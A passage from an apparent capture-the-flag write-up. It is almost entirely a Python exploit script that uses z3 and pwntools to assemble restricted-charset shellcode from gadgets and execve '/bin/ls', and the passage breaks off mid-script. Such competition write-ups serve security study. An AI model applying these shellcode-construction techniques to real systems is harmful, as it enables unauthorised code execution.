If we spray enough (that&rsquo;s why we choose a 3 byte NOP (e.g. G#0) we can craft the masks requiring us only 5 bits, making the exploit feasible.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#from romanpwn import *</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>capstone</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>z3</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>val_static</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>927150662</span><span class=p>,</span> <span class=mi>927150660</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>927150658</span><span class=p>,</span> <span class=mi>860042308</span><span class=p>,</span> <span class=mi>944191811</span><span class=p>,</span> <span class=mi>910570564</span><span class=p>,</span> <span class=mi>893728833</span><span class=p>,</span> <span class=mi>876752962</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>876688449</span><span class=p>,</span> <span class=mi>1110451014</span><span class=p>,</span> <span class=mi>876951111</span><span class=p>,</span> <span class=mi>826552389</span><span class=p>,</span> <span class=mi>960770117</span><span class=p>,</span> <span class=mi>893858882</span><span class=p>,</span> <span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 1178149703</span>
</span></span><span class=line><span class=cl><span class=c1># 1178149700</span>
</span></span><span class=line><span class=cl><span class=c1># 1177690945</span>
</span></span><span class=line><span class=cl><span class=c1># 1110451014</span>
</span></span><span class=line><span class=cl><span class=c1># 591870278 fanno casini (aaa)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>vals</span> <span class=o>=</span> <span class=n>val_static</span> <span class=o>+</span> <span class=p>[</span>
</span></span><span class=line><span class=cl><span class=mh>0x4f4f4f4f</span><span class=p>,</span> <span class=c1># esp + 0x38</span>
</span></span><span class=line><span class=cl><span class=mh>0x2d2d2d2d</span><span class=p>,</span> <span class=c1># esp + 0x40</span>
</span></span><span class=line><span class=cl><span class=mh>0x57202d2d</span><span class=p>,</span> <span class=c1># esp + 0x42</span>
</span></span><span class=line><span class=cl><span class=mh>0x6c655720</span><span class=p>,</span> <span class=c1># esp + 0x44</span>
</span></span><span class=line><span class=cl><span class=mh>0x636c6557</span><span class=p>,</span> <span class=c1># esp + 0x45</span>
</span></span><span class=line><span class=cl><span class=mh>0x6f636c65</span><span class=p>,</span> <span class=c1># esp + 0x46</span>
</span></span><span class=line><span class=cl><span class=mh>0x656d6f63</span><span class=p>,</span> <span class=c1># esp + 0x48</span>
</span></span><span class=line><span class=cl><span class=mh>0x20656d6f</span><span class=p>,</span> <span class=c1># esp + 0x49</span>
</span></span><span class=line><span class=cl><span class=mh>0x7420656d</span><span class=p>]</span> <span class=c1># esp + 0x4a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offsets</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x4f4f4f4f</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x2d2d2d2d</span><span class=p>:</span> <span class=mh>0x8</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x57202d2d</span><span class=p>:</span> <span class=mh>0xa</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x6c655720</span><span class=p>:</span> <span class=mh>0xc</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x636c6557</span><span class=p>:</span> <span class=mh>0xd</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x6f636c65</span><span class=p>:</span> <span class=mh>0xe</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x656d6f63</span><span class=p>:</span> <span class=mh>0x10</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x20656d6f</span><span class=p>:</span> <span class=mh>0x11</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x7420656d</span><span class=p>:</span> <span class=mh>0x12</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>set_eax</span><span class=p>(</span><span class=n>eax_val</span><span class=p>,</span> <span class=n>tolerance</span><span class=o>=</span><span class=mh>0xfff</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># NB assumes edi was not changed!</span>
</span></span><span class=line><span class=cl>    <span class=n>solver</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>l</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>exp</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>vals</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>temp</span> <span class=o>=</span> <span class=n>BitVec</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>),</span> <span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>l</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>temp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>Or</span><span class=p>(</span><span class=n>temp</span> <span class=o>==</span> <span class=mi>0</span><span class=p>,</span> <span class=n>temp</span> <span class=o>==</span> <span class=mh>0xffffffff</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>exp</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>exp</span> <span class=o>=</span> <span class=n>exp</span> <span class=o>^</span> <span class=p>(</span><span class=n>vals</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=n>temp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>exp</span> <span class=o>=</span> <span class=p>(</span><span class=n>vals</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>*</span> <span class=n>temp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>exp</span> <span class=o>&gt;=</span> <span class=n>eax_val</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>exp</span> <span class=o>&lt;=</span> <span class=n>eax_val</span> <span class=o>+</span> <span class=n>tolerance</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>solver</span><span class=o>.</span><span class=n>check</span><span class=p>()</span> <span class=o>==</span> <span class=n>unsat</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s1>&#39;UNSAT&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>solver</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>vals</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>m</span><span class=p>[</span><span class=n>l</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(hex(vals[i]))</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span> <span class=o>^=</span> <span class=n>vals</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=s2>&#34;Address found:&#34;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#assert res == eax_val </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>18</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>m</span><span class=p>[</span><span class=n>l</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># NB increases esp</span>
</span></span><span class=line><span class=cl>            <span class=n>temp</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;L&#39;</span><span class=p>,</span> <span class=n>vals</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>shellcode</span> <span class=o>+=</span> <span class=p>[</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=n>temp</span><span class=p>[:</span><span class=mi>2</span><span class=p>],</span> <span class=n>temp</span><span class=p>[</span><span class=mi>2</span><span class=p>:]]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>incs</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>18</span><span class=p>,</span> <span class=mi>27</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>m</span><span class=p>[</span><span class=n>l</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=n>incs</span> <span class=o>&lt;</span> <span class=n>offsets</span><span class=p>[</span><span class=n>vals</span><span class=p>[</span><span class=n>i</span><span class=p>]]:</span>
</span></span><span class=line><span class=cl>                <span class=n>shellcode</span> <span class=o>+=</span> <span class=p>[</span><span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>]</span>  <span class=c1># inc edi</span>
</span></span><span class=line><span class=cl>                <span class=n>incs</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>shellcode</span> <span class=o>+=</span> <span class=p>[</span><span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>shellcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#print set_eax(0x40404a4b)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>set_al</span><span class=p>(</span><span class=n>al_val</span><span class=p>,</span> <span class=n>prev_value</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>position</span><span class=o>=</span><span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>bytelist</span> <span class=o>=</span> <span class=p>[</span><span class=mi>178</span><span class=p>,</span> <span class=mi>201</span><span class=p>,</span> <span class=mi>245</span><span class=p>,</span> <span class=mi>108</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=mi>152</span><span class=p>,</span> <span class=mi>174</span><span class=p>,</span> <span class=mi>200</span><span class=p>,</span> <span class=mi>223</span><span class=p>,</span> <span class=mi>234</span><span class=p>,</span> <span class=mi>252</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>21</span><span class=p>,</span> <span class=mi>205</span><span class=p>,</span> <span class=mi>226</span><span class=p>,</span> <span class=mi>243</span><span class=p>,</span> <span class=mi>56</span><span class=p>,</span> <span class=mi>67</span><span class=p>,</span> <span class=mi>121</span><span class=p>,</span> <span class=mi>207</span><span class=p>,</span> <span class=mi>238</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>18</span><span class=p>,</span> <span class=mi>59</span><span class=p>,</span> <span class=mi>156</span><span class=p>,</span> <span class=mi>234</span><span class=p>,</span> <span class=mi>102</span><span class=p>,</span> <span class=mi>134</span><span class=p>,</span> <span class=mi>149</span><span class=p>,</span> <span class=mi>162</span><span class=p>,</span> <span class=mi>182</span><span class=p>,</span> <span class=mi>152</span><span class=p>,</span> <span class=mi>191</span><span class=p>,</span> <span class=mi>222</span><span class=p>,</span> <span class=mi>246</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>22</span><span class=p>,</span> <span class=mi>63</span><span class=p>,</span> <span class=mi>94</span><span class=p>,</span> <span class=mi>131</span><span class=p>,</span> <span class=mi>139</span><span class=p>,</span> <span class=mi>156</span><span class=p>,</span> <span class=mi>209</span><span class=p>,</span> <span class=mi>231</span><span class=p>,</span> <span class=mi>26</span><span class=p>,</span> <span class=mi>163</span><span class=p>,</span> <span class=mi>202</span><span class=p>,</span> <span class=mi>73</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>146</span><span class=p>,</span> <span class=mi>163</span><span class=p>,</span> <span class=mi>217</span><span class=p>,</span> <span class=mi>235</span><span class=p>,</span> <span class=mi>103</span><span class=p>,</span> <span class=mi>130</span><span class=p>,</span> <span class=mi>192</span><span class=p>,</span> <span class=mi>222</span><span class=p>,</span> <span class=mi>243</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>59</span><span class=p>,</span> <span class=mi>68</span><span class=p>,</span> <span class=mi>89</span><span class=p>,</span> <span class=mi>108</span><span class=p>,</span> <span class=mi>131</span><span class=p>,</span> <span class=mi>158</span><span class=p>,</span> <span class=mi>197</span><span class=p>,</span> <span class=mi>14</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>61</span><span class=p>,</span> <span class=mi>194</span><span class=p>,</span> <span class=mi>227</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=mi>33</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>255</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>big_vals</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x46</span><span class=p>:</span> <span class=mh>0x37433246</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x44</span><span class=p>:</span> <span class=mh>0x37433244</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x42</span><span class=p>:</span> <span class=mh>0x37433242</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x43</span><span class=p>:</span> <span class=mh>0x38473943</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x41</span><span class=p>:</span> <span class=mh>0x35453841</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x47</span><span class=p>:</span> <span class=mh>0x34453647</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x45</span><span class=p>:</span> <span class=mh>0x31443045</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dvals</span> <span class=o>=</span> <span class=p>{</span><span class=mi>65</span><span class=p>:</span> <span class=p>[</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;A8&#39;</span><span class=p>,</span> <span class=s1>&#39;E5&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>         <span class=mi>66</span><span class=p>:</span> <span class=p>[</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;B2&#39;</span><span class=p>,</span> <span class=s1>&#39;C7&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>         <span class=mi>67</span><span class=p>:</span> <span class=p>[</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;C9&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>         <span class=mi>68</span><span class=p>:</span> <span class=p>[</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;D2&#39;</span><span class=p>,</span> <span class=s1>&#39;C7&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>         <span class=mi>69</span><span class=p>:</span> <span class=p>[</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>,</span> <span class=s1>&#39;D1&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>         <span class=mi>70</span><span class=p>:</span> <span class=p>[</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;F2&#39;</span><span class=p>,</span> <span class=s1>&#39;C7&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>         <span class=mi>71</span><span class=p>:</span> <span class=p>[</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>],</span>     
</span></span><span class=line><span class=cl>        <span class=c1>#0x40: [&#39;B6&#39;, &#39;B2&#39;, &#39;E1&#39;], # 0x31</span>
</span></span><span class=line><span class=cl>        <span class=c1>#0xe5: [&#39;B6&#39;,&#39;B2&#39;, &#39;E2&#39;],  # 0x32</span>
</span></span><span class=line><span class=cl>        <span class=c1>#0xf7: [&#39;B6&#39;,&#39;B2&#39;, &#39;E3&#39;],  # 0x33</span>
</span></span><span class=line><span class=cl>        <span class=c1>#0xff: [&#39;B6&#39;,&#39;B2&#39;, &#39;E4&#39;],  # 0x34</span>
</span></span><span class=line><span class=cl>       <span class=c1># 0x69: [&#39;B6&#39;,&#39;B2&#39;,&#39;E9&#39;]    # 0x39</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>vals</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>dvals</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ebpgadgets</span> <span class=o>=</span> <span class=p>[[</span><span class=s1>&#39;G2&#39;</span><span class=p>,</span> <span class=s1>&#39;E&#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>8</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>incebp</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;E5&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;C6&#39;</span><span class=p>,</span> <span class=s1>&#39;E5&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;C6&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>steps</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>position</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>144</span> <span class=o>/</span> <span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>shellcode</span> <span class=o>+=</span> <span class=n>incebp</span>
</span></span><span class=line><span class=cl>        <span class=n>position</span> <span class=o>=</span> <span class=mi>144</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>position</span> <span class=o>&lt;</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>bytelist</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=mi>144</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>available_bits</span> <span class=o>=</span> <span class=n>bytelist</span><span class=p>[(</span><span class=n>position</span><span class=o>-</span><span class=mi>144</span><span class=p>)</span><span class=o>/</span><span class=mi>4</span><span class=p>:(</span><span class=n>position</span><span class=o>-</span><span class=mi>144</span><span class=p>)</span><span class=o>/</span><span class=mi>4</span><span class=o>+</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=c1>#print(available_bits)</span>
</span></span><span class=line><span class=cl>        <span class=n>tempvals</span> <span class=o>=</span> <span class=n>vals</span> <span class=o>+</span> <span class=n>available_bits</span>
</span></span><span class=line><span class=cl>        <span class=c1>#print(tempvals)</span>
</span></span><span class=line><span class=cl>        <span class=n>solver</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>l</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=n>exp</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>tempvals</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=n>temp</span> <span class=o>=</span> <span class=n>BitVec</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>),</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>l</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>temp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>Or</span><span class=p>(</span><span class=n>temp</span> <span class=o>==</span> <span class=mi>0</span><span class=p>,</span> <span class=n>temp</span> <span class=o>==</span> <span class=mh>0xff</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>exp</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>exp</span> <span class=o>=</span> <span class=n>exp</span> <span class=o>^</span> <span class=p>(</span><span class=n>tempvals</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=n>temp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>exp</span> <span class=o>=</span> <span class=p>(</span><span class=n>tempvals</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=n>temp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>exp</span> <span class=o>==</span> <span class=p>(</span><span class=n>al_val</span> <span class=o>^</span> <span class=n>prev_value</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>solver</span><span class=o>.</span><span class=n>check</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>m</span> <span class=o>=</span> <span class=n>solver</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>vals</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=ow>not</span> <span class=n>m</span><span class=p>[</span><span class=n>l</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;cons&#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>vals</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>                    <span class=c1># NB increases esp</span>
</span></span><span class=line><span class=cl>                    <span class=n>shellcode</span> <span class=o>+=</span> <span class=n>dvals</span><span class=p>[</span><span class=n>vals</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>tempvals</span><span class=p>)</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>vals</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=ow>not</span> <span class=n>m</span><span class=p>[</span><span class=n>l</span><span class=p>[</span><span class=nb>len</span><span class=p>(</span><span class=n>vals</span><span class=p>)</span> <span class=o>+</span> <span class=n>i</span><span class=p>]]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;mem&#39;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>available_bits</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>                    <span class=n>shellcode</span> <span class=o>+=</span> <span class=n>ebpgadgets</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>steps</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>shellcode</span><span class=p>,</span> <span class=n>position</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1>#print(&#34;unsat&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>shellcode</span> <span class=o>+=</span> <span class=n>incebp</span> <span class=o>*</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>            <span class=n>position</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>            <span class=n>steps</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s2>&#34;not solvable!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binshaddr</span> <span class=o>=</span> <span class=mh>0x40404a4f</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>execve</span><span class=p>(</span><span class=s1>&#39;/bin/ls&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;&#39;</span><span class=p>],</span> <span class=p>[]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NOP</span> <span class=o>=</span> <span class=s1>&#39;B7&#39;</span>    <span class=c1>#inc edx; aaa ;</span>
</span></span><span class=line><span class=cl><span class=n>DNOP</span> <span class=o>=</span> <span class=s1>&#39;G#7&#39;</span>    <span class=c1>#inc edi; and esi, dword ptr [edi]; </span>
</span></span><span class=line><span class=cl>
